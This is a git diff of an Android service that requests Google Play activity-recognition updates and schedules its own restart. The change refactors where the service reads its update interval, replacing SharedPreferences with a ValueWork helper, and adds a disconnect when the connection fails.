@@ -9,17 +9,16 @@ import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
-import android.content.SharedPreferences;
 import android.os.Bundle;
 import android.os.IBinder;
-import android.preference.PreferenceManager;
 
 import com.google.android.gms.common.ConnectionResult;
 import com.google.android.gms.common.GooglePlayServicesUtil;
 import com.google.android.gms.common.api.GoogleApiClient;
 import com.google.android.gms.location.ActivityRecognition;
+import com.inet.android.request.ConstantValue;
 import com.inet.android.utils.Logging;
-import com.inet.android.utils.WhileTheMethod;
+import com.inet.android.utils.ValueWork;
 
 /**
  * RecognitionDevService class is designed for start ACTIVITY_RECOGNITION
@@ -33,7 +32,6 @@ public class RecognitionDevService extends Service implements
 	private BroadcastReceiver receiver;
 	private String TAG = RecognitionDevService.class.getSimpleName();
 	private static final int SERVICE_REQUEST_CODE = 27;
-	private SharedPreferences sp;
 	private int timeUp = 0;
 	private Context mContext;
 	private GoogleApiClient googleApiClient;
@@ -64,11 +62,6 @@ public class RecognitionDevService extends Service implements
 							+ intent.getExtras().getInt("Confidence") + "\n");
 				else
 					setActivityDevice("");
-				// sp = PreferenceManager
-				// .getDefaultSharedPreferences(getApplicationContext());
-				// Editor ed = sp.edit();
-				// ed.putString("activity", active);
-				// ed.commit();
 				Logging.doLog(TAG, active, active);
 
 			}
@@ -88,24 +81,20 @@ public class RecognitionDevService extends Service implements
 
 	@Override
 	public int onStartCommand(Intent intent, int flags, int startId) {
-		// ----------restart service
-		// ---------------------------------------------------
-		sp = PreferenceManager
-				.getDefaultSharedPreferences(getApplicationContext());
 
-		// ----------get geo time
-		// ---------------------------------------------------
+		// ----------get geo time------------------------------
 		Logging.doLog(TAG, "onStartCommand ActivityRecognitionClient",
 				"onStartCommand ActivityRecognitionClient");
-		if (sp.getString("geo", "5").equals("0")) {
+		timeUp = ValueWork.getState(ConstantValue.TYPE_LOCATION_TRACKER_REQUEST,
+				this);
+		
+		if (timeUp == 0) {
 			Logging.doLog(TAG, "ActivityRecognitionClient Stop",
 					"ActivityRecognitionClient Stop");
 			stopSelf();
 			return 0;
 		}
-		timeUp = WhileTheMethod.getState(3, this);
-		// ----------restart service
-		// ---------------------------------------------------
+		// ----------restart service----------------------------
 
 		Calendar cal = Calendar.getInstance();
 		cal.add(Calendar.MINUTE, timeUp);// через 5 минут
@@ -125,7 +114,7 @@ public class RecognitionDevService extends Service implements
 
 		if (timeUp == 0)
 			return 0;
-		
+
 		super.onStartCommand(intent, flags, startId);
 		return Service.START_STICKY;
 
@@ -154,7 +143,8 @@ public class RecognitionDevService extends Service implements
 	public void onConnectionFailed(ConnectionResult arg0) {
 		// TODO Auto-generated method stub
 		Logging.doLog(TAG, "onConnectionFailed", "onConnectionFailed");
-
+		if(googleApiClient != null)
+			googleApiClient.disconnect();
 	}
 
 	private void createApiGoogle() {
@@ -173,9 +163,8 @@ public class RecognitionDevService extends Service implements
 		PendingIntent pendingIntent = PendingIntent.getService(this, 0, intent,
 				PendingIntent.FLAG_UPDATE_CURRENT);
 		ActivityRecognition.ActivityRecognitionApi.requestActivityUpdates(
-				googleApiClient, timeUp* 1000 * 60, pendingIntent);
-		
-		
+				googleApiClient, timeUp * 1000 * 60, pendingIntent);
+
 	}
 
 	@Override
